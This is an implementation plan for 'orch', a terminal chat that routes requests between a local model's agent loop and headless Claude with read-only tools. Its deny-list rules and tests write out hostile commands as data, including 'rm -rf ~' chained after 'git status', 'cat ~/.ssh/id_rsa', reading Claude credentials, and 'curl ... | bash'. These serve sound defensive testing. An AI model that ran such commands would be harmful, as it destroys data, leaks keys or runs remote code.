# Chat (`orch`) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Typing `orch` opens a chat, like typing `claude`. Each message is answered by the local model or by Claude, and `orch` decides which, without being told.

**Architecture:** A router looks at every message. Simple requests go to the local model, which works through an agent loop: it asks for a tool (read a file, search, run a command), `orch` runs it under its own rules, and the result goes back until the model answers. Requests the router judges too hard, and turns the local model cannot finish, go to Claude: `claude -p` running headless in the repository with read-only tools, its answer appearing in the same chat. `orch` owns the files and the shell throughout.

**Tech Stack:** unchanged. Node >= 22.18 running TypeScript directly, `node:test`, `node:readline`, zero runtime dependencies.

**Spec:** `CLAUDE.md` (repo root). This plan changes it at the owner's request: Task 1 removes "Agent loops on the local model" from the non-goals, rewrites the "stateless worker" paragraph, and lets the Claude backend use read-only tools in chat. All other Hard rules stay.

## What you asked for, and how the plan answers it

| You asked | The plan |
|---|---|
| A chat like typing `claude` | `orch` with no arguments opens the chat in the current folder |
| The local model reads files and runs things | An agent loop with `read_file`, `list_dir`, `search` and `run_command` |
| `orch` decides local or Claude without you | A router: rules first, then a one-word triage by the local model, then automatic hand-over if the local model struggles |
| Claude works headless in the same chat | `claude -p` in the repository with `Read`, `Grep`, `Glob`; its answer is printed as `claude>` |
| The local model also makes small edits | **Not in this plan.** Edits, by either model, are the next plan: see "Edits come next" |

## Decisions (need your OK)

- **This reverses a rule you wrote.** The spec says the local model "never gets file access or runs an agent loop (small models are unreliable at that)". That warning still holds: expect a 7–9B model to pick wrong tools, loop, and give up more often than Claude. The plan limits the damage (step limit, loop detection, hand-over) but cannot make a small model reliable.
- **The router cannot catch a confident wrong answer.** It sees when the local model is down, slow, stuck, asks for help or gives up. It does not see when a small model answers wrongly with confidence. So the triage is told to send anything unclear to Claude, every answer is labelled `local>` or `claude>`, and `/claude` redoes the last answer with Claude.
- **Routing order.** (1) PC off or erroring: Claude. (2) A message too long for the local window: Claude. (3) Triage: one short call asks the local model to label the request `LOCAL` or `CLAUDE`; a reply that is neither counts as `LOCAL`, so a model that cannot follow the triage does not send everything to your subscription. (4) While the local model works: it calls `ask_claude`, hits 8 tool rounds, repeats a call three times, or answers with a refusal ("I can't", "I don't know"): Claude.
- **Requests to change code go to Claude for now, and Claude cannot change files yet.** Until the edits plan is built, Claude answers such a request with the change written out, and you apply it yourself.
- **Claude runs headless with three read-only tools:** `Read`, `Grep`, `Glob`, in the repository, with `--permission-prompts none` so nothing can wait for an answer nobody gives. It gets no `Bash`, `Edit` or `Write`. Flags are from `claude --help` 2.1.322; Task 6 re-checks them on your Mac with one real call.
- **Claude can read any file in the repository, including `.env`.** That is the same as running `claude` there yourself. The local tools skip secrets files; I have not verified a flag that makes Claude skip them, so this plan does not claim one.
- **Each Claude turn is one `claude -p` call** on your subscription, one at a time, started only by a message you typed. There is no progress display while it works beyond an elapsed-time line; a turn is cut off after 5 minutes.
- **Reading is free, running needs your approval.** The local model's file tools run without asking, inside the repository only. Every command is shown first: `y` runs it, `n` refuses, `a` stops asking for that exact command this session.
- **A short allow-list runs without asking:** `git status`, `git diff`, `git log`, `ls`, `pwd`. You can add entries such as `npm test` in your local config. A command is auto-approved only when it contains no shell operators.
- **Some commands are refused whatever you answer:** `rm` with `-r` or `-f`, `git reset --hard`, `git clean`, `git push`, discarding changes, commit-making git commands on `main` or `master`, `sudo`, and anything touching `~/.claude` or `~/.ssh`. A backstop for the hard rules, not a guarantee: your approval is the real control.
- **Whatever the tools read is sent to a model:** your PC for local turns, Anthropic for Claude turns.
- **It needs a local model with tool-calling support.** Ollama's examples use `qwen3`. Whether `qwen2.5-coder:7b` supports tools has to be checked on the PC; a model without it gets a clear error, and every turn then goes to Claude.
- **Chat turns are logged but kept out of the model comparison:** `mode: "chat"` in `runs/log.jsonl`, shown by `orch report --mode chat`. Each session's full transcript is saved under `runs/<session id>/`.

## Edits come next

You chose "also small edits" for the local model and headless Claude in the same chat. Both mean a model changing your files without a prompt per edit, and the spec says code changes never land on your branch directly. The design that satisfies both, for the plan after this one:

- Every edit, by either model, happens in a throwaway git worktree (the mechanism in `2026-11-12-small-edit.md`, already checked against real git).
- The local model edits one function at a time; your test command verifies it. Claude gets `Edit` and `Write` inside the worktree only.
- The chat shows the result as a patch. `/apply` puts it in your working tree; nothing changes before that.

That plan is written after this one is built and tried, because how well the router and the local model behave on your hardware will shape it.

## Global Constraints

- The Hard rules in `CLAUDE.md` apply, as amended in Task 1. The Claude backend still only spawns the unmodified `claude` binary, never touches credentials, and runs one call at a time.
- In chat, the Claude tool list is the constant `Read,Grep,Glob`. No code path passes `Bash`, `Edit`, `Write` or `default`.
- The local model never executes anything. It returns tool requests; `orch` validates and runs them.
- Local file tools resolve every path with `realpath` and refuse anything outside the repository root.
- `run_command` runs only after `classifyCommand` returns `allow`, or returns `ask` and the user answers `yes` or `always`. No answer (end of input) means no.
- There is no flag or config value that approves all commands.
- Tool results are capped at 4500 characters. The history sent to Ollama stays within `agent.historyTokenBudget` (default 5000 tokens, at 3 characters per token).
- Wire format, from Ollama's documentation: tools are `{ "type": "function", "function": { name, description, parameters } }`; a tool call arrives in `message.tool_calls[].function` with `arguments` as a JSON object; a result is sent as `{ "role": "tool", "tool_name": ..., "content": ... }` after the assistant message that asked for it. One response may hold several calls.
- stdout carries the conversation. Tool activity, routing notes and approval prompts go to stderr.
- Zero runtime dependencies. Tests first. `npm test` needs neither the PC nor the real `claude`.

## Review Focus

1. **A local model that loops or never answers:** the same tool call three times, or eight rounds without an answer, ends the local attempt and hands the turn to Claude. (Task 5)
2. **Path escapes:** `../x`, an absolute path, a symlink inside the repository that points outside it, and a secrets file are all refused by `read_file`, `list_dir` and `search`. (Task 2)
3. **Command tricks:** `git status; rm -rf ~` is not auto-approved and is refused; a deny-listed command never runs even after `y`; end of input at the approval prompt runs nothing. (Tasks 1 and 8)
4. **Huge tool output:** a 5 MB file or a command that prints megabytes is cut to the cap, and a long conversation still fits the context window. (Tasks 2 and 4)
5. **A triage that misbehaves:** a model that answers the triage with an essay, with nothing, or cannot be reached must not crash the chat, must not loop, and must not send every message to Claude. (Task 7)

## File map

| File | Responsibility |
|---|---|
| `src/core/command.ts` | `runCommand`: run a shell command with a timeout, kill its process group |
| `src/agent/permissions.ts` | `classifyCommand`: allow, ask or deny |
| `src/agent/messages.ts` | chat message and tool-call types |
| `src/agent/tools.ts` | tool definitions, path guard, `read_file`, `list_dir`, `search` |
| `src/backends/ollama.ts` | `chat()` with tools |
| `src/agent/history.ts` | fit history to the window, render a transcript for Claude |
| `src/agent/loop.ts` | one local turn: model, tools, until an answer or a hand-over |
| `src/backends/claude-cli.ts` | `runAgent()`: headless Claude with read-only tools |
| `src/agent/router.ts` | decide local or Claude before the local model tries |
| `src/agent/chat-session.ts` | conversation state, hand-over, logging |
| `src/agent/repl.ts`, `src/cli.ts` | the terminal interface; `orch` and `orch chat` |

---

### Task 1: Spec change, command runner, command permissions

**Files:**
- Modify: `CLAUDE.md`, `src/core/config.ts`, `config/orchestrator.config.json` (chain `"chat": ["pc-ollama", "claude"]`)
- Create: `src/core/command.ts`, `src/agent/permissions.ts`
- Test: `test/command.test.ts`, `test/permissions.test.ts`, additions to `test/config.test.ts`

**Interfaces — Produces:**

```ts
// src/core/command.ts
export interface CommandResult { ok: boolean; exitCode: number | null; timedOut: boolean; output: string }
export function runCommand(command: string, opts: { cwd: string; timeoutMs: number; signal?: AbortSignal }): Promise<CommandResult>;

// src/agent/permissions.ts
export type CommandVerdict = { decision: "allow" } | { decision: "ask" } | { decision: "deny"; reason: string };
export function classifyCommand(command: string, opts: { allowCommands: string[]; onMainBranch: boolean }): CommandVerdict;

// src/core/config.ts — OrchestratorConfig gains
agent: { maxSteps: number; commandTimeoutMs: number; allowCommands: string[]; historyTokenBudget: number; claudeTranscriptTokens: number };
// defaults: 8, 60000, ["git status", "git diff", "git log", "ls", "pwd"], 5000, 20000
```

`runCommand` spawns with `{ shell: true, cwd, detached: true }`, merges stdout and stderr into `output` (last 20 000 characters), never rejects, and kills the process group (`process.kill(-pid, "SIGKILL")`) on timeout or abort. The M4 plan specifies the same function in `src/core/verifier.ts`; whichever plan is built second imports this one.

`classifyCommand`, in this order:
1. **deny**, with a reason naming the rule, when the command matches any of: `rm` with a flag containing `r` or `f` (or `--recursive`, `--force`); `git reset --hard`; `git clean`; `git push`; `git checkout --`; `git restore`; `git stash drop` or `clear`; `sudo`; a pipe into `sh`, `bash` or `zsh`; `chmod -R` or `chown -R`; `mkfs`, `dd if=`, `shutdown`, `reboot`; any mention of `.claude`, `.credentials`, `.ssh` or `security find-`; and, when `onMainBranch`, `git commit`, `merge`, `rebase`, `cherry-pick`, `revert` or `am`.
2. **allow** when the command contains none of ``; & | > < $ ` ( ) { } \`` or a newline, has no `--output` argument, and equals an `allowCommands` entry or starts with one followed by a space.
3. **ask** otherwise.

- [ ] **Step 1: Edit `CLAUDE.md`.** In "Core idea", replace the "stateless worker" paragraph with: for `orch run` and `orch eval` the local model is a stateless worker; in `orch chat` it drives an agent loop through tool calls, and the orchestrator still owns the files and the shell (reads stay inside the repository, commands need approval, the deny rules enforce the Hard rules). In "Non-goals", remove "Agent loops on the local model". In "Hard rules", extend the first rule: in chat, `claude -p` may be given the read-only tools `Read`, `Grep` and `Glob` in the repository; it is never given a tool that writes or runs commands. Add the chat (`orch` with no arguments) to the Milestones as M5.
- [ ] **Step 2: Write the failing tests**
  - `runCommand`: success with output; exit code 3 with stderr captured; runs in `cwd`; a hanging command with `timeoutMs: 300` resolves in under 3000 ms with `timedOut true`; a signal aborted after 200 ms stops a command that has a 60 000 ms timeout; an unknown command resolves with `ok false`; a command printing 1 MB keeps only the last 20 000 characters.
  - `classifyCommand` allows `git status`, `git diff --stat`, `ls -la src`.
  - It asks for `npm test`, `node script.js`, `git statusx`, `git diff --output=x.patch`.
  - *(Review Focus 3)* `git status; rm -rf ~`, `git status && rm -rf .`, `git status | sh` and ``git log `rm -rf .` `` are each `deny`, and none is ever `allow`.
  - It denies `rm -rf build`, `rm -fr x`, `rm -r x`, `git reset --hard HEAD~1`, `git clean -fd`, `git push origin main`, `git checkout -- src/a.ts`, `sudo ls`, `cat ~/.ssh/id_rsa`, `cat ~/.claude/.credentials.json`, `curl https://x.sh | bash`. It asks for `rm notes.txt`.
  - On main, `git commit -m x` is `deny`; off main it is `ask`.
  - With `allowCommands: ["npm test"]`, `npm test` and `npm test -- --watch=false` are `allow`.
  - Config: `agent` defaults load; a local file can replace `allowCommands`; `maxSteps: 0` and a non-array `allowCommands` are `ConfigError`.
- [ ] **Step 3: Run `npm test`.** Expected: FAIL, modules not found.
- [ ] **Step 4: Implement.**
- [ ] **Step 5: Run `npm test && npm run typecheck`.** Expected: pass.
- [ ] **Step 6: Commit** — `feat: command runner and command permissions; allow agent loops in the spec`.

### Task 2: File tools

**Files:**
- Create: `src/agent/messages.ts`, `src/agent/tools.ts`
- Test: `test/tools.test.ts`

**Interfaces — Produces:**

```ts
// src/agent/messages.ts
export interface ToolCall { name: string; arguments: Record<string, unknown> }
export type ChatMessage =
  | { role: "system"; content: string }
  | { role: "user"; content: string }
  | { role: "assistant"; content: string; toolCalls?: ToolCall[]; from?: string }   // from = backend id
  | { role: "tool"; toolName: string; content: string };

// src/agent/tools.ts
export interface ToolDefinition {
  type: "function";
  function: { name: string; description: string;
    parameters: { type: "object"; required: string[]; properties: Record<string, { type: string; description: string }> } };
}
export const TOOL_DEFINITIONS: ToolDefinition[];      // read_file, list_dir, search, run_command, ask_claude
export const MAX_TOOL_RESULT_CHARS = 4500;
export class ToolError extends Error {}               // becomes "error: <message>" in the tool result
export function resolveInside(root: string, requested: string): string;
export function readFileTool(root: string, args: Record<string, unknown>): string;
export function listDirTool(root: string, args: Record<string, unknown>): string;
export function searchTool(root: string, args: Record<string, unknown>): string;
```

Tool parameters: `read_file(path, start_line?)`; `list_dir(path?)`; `search(query, path?)`; `run_command(command)`; `ask_claude(reason)`.

- `resolveInside`: join with the root, take `realpath`, and throw `ToolError("path is outside the repository")` unless the result is the root or under it. A path that does not exist throws `ToolError("no such file or directory: <path>")`.
- Refused by all three tools with `ToolError("refused: <path> looks like a secrets file")`: a base name matching `.env`, `.env.*`, `*.pem`, `*.key`, `id_rsa*`, `id_ed25519*`, `.npmrc`, `.netrc` or `credentials*`, and any path under `.git/`.
- `read_file`: at most 200 lines and `MAX_TOOL_RESULT_CHARS` per call, each line prefixed `<number>: `, followed by `[lines A-B of N; call read_file again with start_line=B+1]` when more remain. A file with a NUL byte in its first 8000 bytes throws `ToolError("binary file")`. A missing or non-string `path` throws `ToolError`.
- `list_dir`: sorted names, directories with a trailing `/`, `.git` left out, at most 200 entries, then `[N more entries]`.
- `search`: `query` is a literal string, matched case-insensitively. Walks the tree under `path` (default the root), skipping `.git`, `node_modules`, secrets files, binary files and files over 1 MB; stops after 5000 files. Output lines are `<path>:<line>: <text cut to 200 characters>`, at most 40, then `[stopped after 40 matches]`. No match returns `no matches`.

- [ ] **Step 1: Write the failing tests** (fixture: a temp directory with `src/math.js`, a 950-line `big.txt`, `.env`, `keys/server.pem`, `.git/config`, a binary file, `node_modules/dep/index.js`, and a symlink `outside` pointing to a directory beside the root)
  - `TOOL_DEFINITIONS` has the five names, each with `type "function"`, a description and `parameters.type "object"`; `required` lists exactly the non-optional parameters.
  - `read_file` returns numbered lines; on `big.txt` it returns lines 1–200 and the continuation note; with `start_line: 201` it starts at `201: `.
  - *(Review Focus 2)* `read_file` throws `ToolError` for `../secret.txt`, for an absolute path outside the root, for `outside/file.txt` (the symlink), for `.env`, `keys/server.pem` and `.git/config`. `list_dir("..")` and `search` with `path: "../"` throw too.
  - *(Review Focus 4)* a 5 MB single-line file read through `read_file` returns at most `MAX_TOOL_RESULT_CHARS` characters.
  - `read_file` on the binary file throws `ToolError("binary file")`; with no `path` it throws `ToolError`.
  - `list_dir` lists `src/` with a slash, omits `.git`, and caps a 300-entry directory at 200 with the count of the rest.
  - `search` finds a function name case-insensitively with path and line number; never reports matches from `.env`, `node_modules` or `.git`; treats `a.b(` as literal text; returns `no matches`; stops at 40 matches.
- [ ] **Step 2: Run `npm test`.** Expected: FAIL.
- [ ] **Step 3: Implement.**
- [ ] **Step 4: Run `npm test && npm run typecheck`.** Expected: pass.
- [ ] **Step 5: Commit** — `feat: read-only file tools for the agent`.

### Task 3: Ollama chat with tools

**Files:**
- Modify: `src/backends/ollama.ts`, `src/core/types.ts`, `test/helpers/fake-ollama.ts`
- Test: `test/ollama-chat.test.ts`

**Interfaces:**
- Consumes: `ChatMessage`, `ToolCall`, `ToolDefinition` (Task 2).
- Produces:

```ts
// src/core/types.ts
export interface ChatRequest { messages: ChatMessage[]; tools: ToolDefinition[]; timeoutMs: number }
export interface ChatResult { content: string; toolCalls: ToolCall[]; durationMs: number; promptTokens?: number; outputTokens?: number }
export interface ChatBackend { id: string; name: string; model: string; kind: "local"; timeoutMs: number;
  healthCheck(): Promise<boolean>; chat(req: ChatRequest): Promise<ChatResult> }

// src/backends/ollama.ts
export class OllamaBackend implements Backend, ChatBackend   // gains chat()

// test/helpers/fake-ollama.ts
export function scriptedChat(replies: Array<{ content?: string; tool_calls?: unknown[] } | { status: number; error: string }>): FakeHandler;
```

`chat` sends `POST /api/chat` with `{ model, messages, tools, stream: false, options }`. Messages map to the wire format: `toolCalls` becomes `tool_calls: [{ function: { name, arguments } }]`; a tool message becomes `{ role: "tool", tool_name, content }`; `from` is not sent. The response maps back: `message.tool_calls[].function` to `toolCalls`, where an entry whose `name` is not a string is dropped and `arguments` that is not an object becomes `{}`. Error handling is the same as `run` (timeout, unreachable, HTTP error, truncated prompt), with two differences: empty `content` is fine when there is at least one tool call, and an HTTP error whose text mentions tools adds the hint `this model does not support tool calling: pick one with tool support (Ollama's own examples use qwen3)`.

- [ ] **Step 1: Write the failing tests**
  - `sends messages and tools in Ollama's format`: the request body has the `tools` array unchanged, an assistant message with `tool_calls[0].function.arguments` as an object, and a tool message with `tool_name`.
  - `maps a tool call`: a reply with `tool_calls: [{ function: { name: "read_file", arguments: { path: "a.js" } } }]` and empty content gives `toolCalls` of length 1 and `content ""`.
  - `maps several calls in one reply`.
  - `maps a plain answer`: `toolCalls` is `[]`.
  - `tolerates malformed calls`: `arguments: "not json"` becomes `{}`; a call without a name is dropped.
  - `an empty reply with no tool call is a backend error`.
  - `a model without tool support gets a clear error`: HTTP 400 `{"error":"... does not support tools"}` rejects with `backend_error` and a message containing `does not support tool calling`.
  - `timeout`, `unreachable` and `truncated prompt` behave as in `run`.
- [ ] **Step 2: Run `npm test`.** Expected: FAIL.
- [ ] **Step 3: Implement.** Share the request and error handling between `run` and `chat` in one private method.
- [ ] **Step 4: Run `npm test && npm run typecheck`.** Expected: pass.
- [ ] **Step 5: Commit** — `feat: Ollama chat with tool calling`.

### Task 4: History that fits the window

**Files:**
- Create: `src/agent/history.ts`
- Test: `test/history.test.ts`

**Interfaces — Produces:**

```ts
export function messageTokens(message: ChatMessage): number;                              // estimateTokens of content plus tool-call JSON, plus 4
export function fitHistory(messages: ChatMessage[], budgetTokens: number): ChatMessage[];
export function renderTranscript(messages: ChatMessage[], budgetTokens: number): string;
```

`fitHistory` keeps the system message and then the newest messages that fit the budget. It never returns a history that starts (after the system message) with a tool message or with an assistant message whose tool results were cut: it drops whole groups, a group being an assistant message with tool calls plus its tool results. The latest user message is always kept, even alone over budget. When anything was dropped, the first kept message is preceded by `{ role: "user", content: "[earlier conversation omitted]" }`.

`renderTranscript` writes one block per message, newest kept first when over budget, in chronological order: `User:`, `Assistant (<from>):`, `Tool call: <name>(<arguments as JSON>)`, `Tool result (<name>):`. The system message is left out.

- [ ] **Step 1: Write the failing tests**
  - `a short history is returned unchanged`.
  - `drops the oldest turns first and marks the cut`.
  - `never splits a tool-call group`: with a budget that fits the results but not their assistant message, the whole group is dropped.
  - `keeps the system message and the last user message whatever the budget`.
  - *(Review Focus 4)* `forty turns with 4500-character tool results fit`: the sum of `messageTokens` over the result is at most the budget.
  - `renderTranscript` labels each role, shows tool calls with their arguments, omits the system message, and stays within its budget on a long conversation while keeping the last user message.
- [ ] **Step 2: Run `npm test`.** Expected: FAIL.
- [ ] **Step 3: Implement.**
- [ ] **Step 4: Run `npm test && npm run typecheck`.** Expected: pass.
- [ ] **Step 5: Commit** — `feat: fit chat history to the context window`.

### Task 5: The agent loop

**Files:**
- Create: `src/agent/loop.ts`, `test/helpers/fake-chat-backend.ts`
- Test: `test/loop.test.ts`

**Interfaces:**
- Consumes: Tasks 1–4.
- Produces:

```ts
export type EscalationReason =
  | "pc_unreachable" | "timeout" | "backend_error"      // the local backend failed
  | "agent_asked" | "step_limit" | "gave_up"            // the local model could not finish
  | "triage" | "too_long" | "user_request";             // decided before the local model tried (Task 7)
export type Approval = "yes" | "no" | "always";
export type AgentEvent =
  | { type: "tool"; name: string; summary: string }                                  // e.g. read_file src/a.ts
  | { type: "command"; command: string; verdict: "allowed" | "approved" | "declined" | "refused"; exitCode?: number | null };
export interface TurnResult {
  outcome: { kind: "answer"; text: string } | { kind: "escalate"; reason: EscalationReason; detail: string };
  steps: number; durationMs: number; promptTokens: number; outputTokens: number;
}
export const SYSTEM_PROMPT: (root: string) => string;
export function runAgentTurn(opts: {
  backend: ChatBackend; messages: ChatMessage[];        // appended to in place
  root: string; maxSteps: number; historyTokenBudget: number; commandTimeoutMs: number;
  allowCommands: string[]; sessionAllowed: Set<string>; onMainBranch: boolean;
  approve: (command: string) => Promise<Approval>;
  onEvent?: (event: AgentEvent) => void; signal?: AbortSignal;
}): Promise<TurnResult>;

// test/helpers/fake-chat-backend.ts
export function fakeChatBackend(replies: Array<Partial<ChatResult> | BackendError>, opts?: { healthy?: boolean }):
  ChatBackend & { requests: ChatRequest[] };
```

System prompt (exact copy):

```
You are a coding assistant working in the repository at {root}.
You can call tools to read files, list directories, search, and run commands. The user approves commands before they run.
Rules:
- Use a tool when you need facts about the code. Do not guess file contents.
- Paths are relative to the repository root.
- Keep answers short and concrete.
- If the task is beyond you, or you have tried twice without progress, call ask_claude with a one-line reason.
```

One turn: `healthCheck()` first; `false` escalates with `pc_unreachable`. Then, up to `maxSteps` times: `chat` with `fitHistory(messages, historyTokenBudget)` and `TOOL_DEFINITIONS`. A `BackendError` escalates with its reason. A reply with no tool calls is the answer. Otherwise the assistant message is appended and each call is handled in order, its result appended as a tool message:
- `ask_claude`: escalate with `agent_asked` and the given reason. Remaining calls are not run.
- `read_file`, `list_dir`, `search`: run the tool; a `ToolError` becomes `error: <message>`.
- `run_command`: `classifyCommand`. `deny` gives `refused: <reason>`. `ask` calls `approve`, unless the exact command is in `sessionAllowed`; `no` gives `the user declined to run this command`; `always` adds it to `sessionAllowed`. Then `runCommand` in `root`; the result is `exit code N` plus the last 4000 characters of output, or `timed out after N s`.
- anything else: `error: unknown tool <name> (available: ...)`.

The same call (same name and arguments) made for the third time in one turn escalates with `step_limit` and detail `repeated the same tool call`. Reaching `maxSteps` without an answer escalates with `step_limit`.

- [ ] **Step 1: Write the failing tests**
  - `answers directly`: one reply with content; `kind "answer"`; the first request starts with the system prompt and carries the five tools.
  - `reads a file then answers`: reply 1 calls `read_file`; the second request ends with a tool message containing the file's text; `steps` is 2.
  - `runs several calls from one reply in order`.
  - `feeds a tool error back`: a path outside the root gives a tool message starting `error:` and the loop continues.
  - `unknown tool` and `missing argument` each give an `error:` tool message, not a throw.
  - `runs an allow-listed command without asking`: `approve` is never called; the tool message has `exit code 0`.
  - `asks before another command`: with `approve` returning `yes`, the command runs once; with `no`, it does not run (a marker file is absent) and the tool message says the user declined.
  - `always is remembered for the session`: the second identical command does not call `approve` again.
  - *(Review Focus 3)* `a refused command never reaches approve`: `rm -rf .` gives `refused:`; the directory is intact.
  - `ask_claude escalates`: `reason "agent_asked"` with the model's reason as detail.
  - *(Review Focus 1)* `the same call three times escalates`; `eight rounds of different calls escalate with step_limit`; neither makes more than `maxSteps` requests.
  - `an unreachable PC escalates before any chat request`; `a timeout escalates with timeout`.
  - `events are reported`: one `tool` event per file tool and one `command` event with its verdict and exit code.
- [ ] **Step 2: Run `npm test`.** Expected: FAIL.
- [ ] **Step 3: Implement.**
- [ ] **Step 4: Run `npm test && npm run typecheck`.** Expected: pass.
- [ ] **Step 5: Commit** — `feat: agent loop for the local model`.

### Task 6: Headless Claude with read-only tools

**Files:**
- Modify: `src/backends/claude-cli.ts`, `docs/claude-cli-flags.md`, `test/fixtures/fake-claude.mjs` (records its working directory already; no change expected)
- Test: `test/claude-agent.test.ts`

**Interfaces — Produces:**

```ts
// src/backends/claude-cli.ts
export const CHAT_TOOLS = "Read,Grep,Glob";
// ClaudeCliBackend gains:
runAgent(req: { prompt: string; cwd: string; timeoutMs: number }): Promise<BackendResult>;
```

`runAgent` spawns `claude` with exactly these arguments, the prompt on stdin, and `cwd` as the working directory:

`-p --output-format json --tools Read,Grep,Glob --permission-prompts none --no-session-persistence --safe-mode` (plus `--model <name>` when configured).

Everything else is shared with `run`: the serial queue, the billing-variable refusal, the timeout with `SIGTERM`, the JSON parsing and the error classification. `run` itself is unchanged (`--tools ""`, a temp directory).

| Flag | Why | Help text (2.1.322) |
|---|---|---|
| `--tools Read,Grep,Glob` | the only tools Claude gets: it can look, not touch | "specify tool names (e.g. \"Bash,Edit,Read\")" |
| `--permission-prompts none` | headless: nothing may wait for an answer | "anything that would prompt is denied automatically" |

- [ ] **Step 1: Write the failing tests** (with `testOnly.bin` set to the fake)
  - `passes the read-only tool list and no other tools`: the recorded arguments are exactly the list above.
  - `runs in the given directory`: the fake's recorded `cwd` is the directory passed in.
  - `shares the queue with run`: a `run` and a `runAgent` started together do not overlap in the trace file.
  - `refuses when a billing variable is set`, `times out`, and `reports is_error` exactly as `run` does.
  - `run is unchanged`: its arguments still contain `--tools`, `""` and not `--permission-prompts`.
- [ ] **Step 2: Run `npm test`.** Expected: FAIL (`runAgent` does not exist).
- [ ] **Step 3: Implement.** Add the two flags to `docs/claude-cli-flags.md`, in a section "Chat (read-only tools)".
- [ ] **Step 4: Run `npm test && npm run typecheck`.** Expected: pass.
- [ ] **Step 5: On the Mac, one real call:** in a repository, `echo "Which file defines the CLI entry point? Answer in one line." | claude -p --output-format json --tools Read,Grep,Glob --permission-prompts none --no-session-persistence --safe-mode`. It answers with a file name and does not hang. If a flag is rejected or it waits for input, record what happened in `docs/claude-cli-flags.md` and stop: the hand-over design depends on this call.
- [ ] **Step 6: Commit** — `feat: headless Claude with read-only tools`.

### Task 7: The router, the chat session, and logging

**Files:**
- Create: `src/agent/router.ts`, `src/agent/chat-session.ts`
- Modify: `src/backends/ollama.ts` (`chat` omits `tools` from the request when the array is empty), `src/core/types.ts` (`FallbackReason` gains `"agent_asked" | "step_limit" | "gave_up" | "triage" | "too_long" | "user_request"`; `AttemptRecord.mode` gains `"chat"`), `src/log/run-log.ts`, `src/log/report.ts`, `src/cli.ts` (report's `--mode` accepts `chat`)
- Test: `test/router.test.ts`, `test/chat-session.test.ts`, additions to `test/report.test.ts` and `test/run-log.test.ts`

**Interfaces:**
- Consumes: `runAgentTurn`, `EscalationReason`, `renderTranscript`, `ClaudeCliBackend.runAgent`, `RunLog`.
- Produces:

```ts
// src/agent/router.ts
export type Route = { to: "local" } | { to: "claude"; reason: "pc_unreachable" | "too_long" | "triage"; detail: string };
export const TRIAGE_PROMPT: (message: string) => string;
export function looksLikeGivingUp(answer: string): boolean;
export function route(opts: { local: ChatBackend; message: string; historyTokenBudget: number; triageTimeoutMs?: number }): Promise<Route>;

// src/agent/chat-session.ts
export interface CloudAgent { id: string; timeoutMs: number; runAgent(req: { prompt: string; cwd: string; timeoutMs: number }): Promise<BackendResult> }
export interface ChatReply { text: string; answeredBy: string | null; routedBecause: EscalationReason | null; error?: string }
export class ChatSession {
  constructor(opts: {
    local: ChatBackend; cloud: CloudAgent | null; root: string; onMainBranch: boolean;
    agent: OrchestratorConfig["agent"]; log: RunLog;
    approve: (command: string) => Promise<Approval>; onEvent?: (event: AgentEvent) => void;
  });
  readonly sessionId: string;
  send(text: string): Promise<ChatReply>;
  askClaude(): Promise<ChatReply>;      // "/claude": answer the last user message again, with Claude
  clear(): void;
}
// src/log/run-log.ts
appendArtifact(runId: string, name: string, line: string): string;   // appends line + "\n" to runs/<runId>/<name>
```

`route`, in order:
1. `local.healthCheck()` is false: Claude, `pc_unreachable`.
2. The message is more than half of `historyTokenBudget`: Claude, `too_long`.
3. Triage: `local.chat` with one user message, `TRIAGE_PROMPT(message)`, no tools, and `triageTimeoutMs` (default 15 000). A reply whose first word, ignoring case and punctuation, is `CLAUDE`: Claude, `triage`. Any other reply, including an empty one, a long one, or `LOCAL`: local. A `BackendError` with reason `pc_unreachable`: Claude, `pc_unreachable`. Any other error: local (the loop will report it properly).

Triage prompt (exact copy):

```
You are a router. Read the request and reply with exactly one word.

LOCAL  - a question that can be answered by reading a few files, searching the code, or running one command.
CLAUDE - writing or changing code, debugging, design, anything that needs several steps, or anything unclear.

When unsure, reply CLAUDE.

Request:
{message}
```

`looksLikeGivingUp`: true for an empty answer and for one that starts with "I can't", "I cannot", "I don't know", "I do not know", "I'm not able", "I am unable", "Sorry", "Unfortunately, I", in any letter case.

`ChatSession.send`: append the user message; `route`. For `local`, run `runAgentTurn`; an answer for which `looksLikeGivingUp` is true is dropped from the history and treated as an escalation with `gave_up`. An escalation, or a `claude` route, calls Claude.

Calling Claude: `cloud.runAgent({ prompt, cwd: root, timeoutMs: cloud.timeoutMs })` with this prompt (exact copy), the transcript being `renderTranscript(messages, agent.claudeTranscriptTokens)`:

```
You are answering in a terminal chat about the repository in the current directory. You can read files and search with your tools. You cannot change files or run commands: when a change is needed, show it as a diff the user can apply.
The conversation so far is below; some of it was handled by a small local model, whose statements may be wrong. Answer the user's last message. Be concise.

{transcript}
```

Claude's answer is appended as an assistant message with `from` set to the cloud id. With no cloud backend, or when it fails, `send` resolves with `answeredBy: null` and `error` set; the conversation keeps the user message.

Logging, per user turn: one `AttemptRecord` for tier 0 (even when the router sent the message straight to Claude: `durationMs` is the routing time and `fallbackReason` the route's reason) and, when Claude was called, one for tier 1. `mode "chat"`, `taskType "chat"`, `runId` the session id, `taskId "turn-<n>"`, `verify "skipped"`, `attempt 0`, `repo` the root, `escalated` true on the tier-0 record when Claude was called, `outputFile` the transcript path. Every message, routing decision, tool event and reply is also appended as one JSON line to `runs/<sessionId>/transcript.jsonl`.

`orch report`: without `--mode`, chat records are left out. `--mode chat` shows them; the escalation rate counts sessions' turns (`runId` plus `taskId`) in which the group handed over.

- [ ] **Step 1: Write the failing tests**

`test/router.test.ts`, with `fakeChatBackend`:
  - `LOCAL goes to the local model`; `CLAUDE goes to Claude` with reason `triage`; `claude.` and `Claude - this needs code changes` count as `CLAUDE`.
  - *(Review Focus 5)* an empty reply, a 300-word essay, and `MAYBE` all route to `local`.
  - *(Review Focus 5)* `a triage timeout routes to local`; `an unreachable PC routes to Claude` without a chat request when the health check fails, and with `pc_unreachable` when the triage call itself cannot connect.
  - `a long message skips the triage`: 10 000 characters routes to Claude with `too_long`, and the backend received no chat request.
  - `the triage request has no tools and one user message` containing the user's text.
  - `looksLikeGivingUp` is true for `""`, `I can't determine that.`, `sorry, I don't have access`; false for `The function clamps n.` and `I can see that the test fails because ...`.

`test/chat-session.test.ts`, with `fakeChatBackend` and a fake `CloudAgent`:
  - `a local answer`: `answeredBy` is the local id, `routedBecause null`; one record with `mode "chat"`, `tier 0`, `fallbackReason null`, `taskId "turn-1"`.
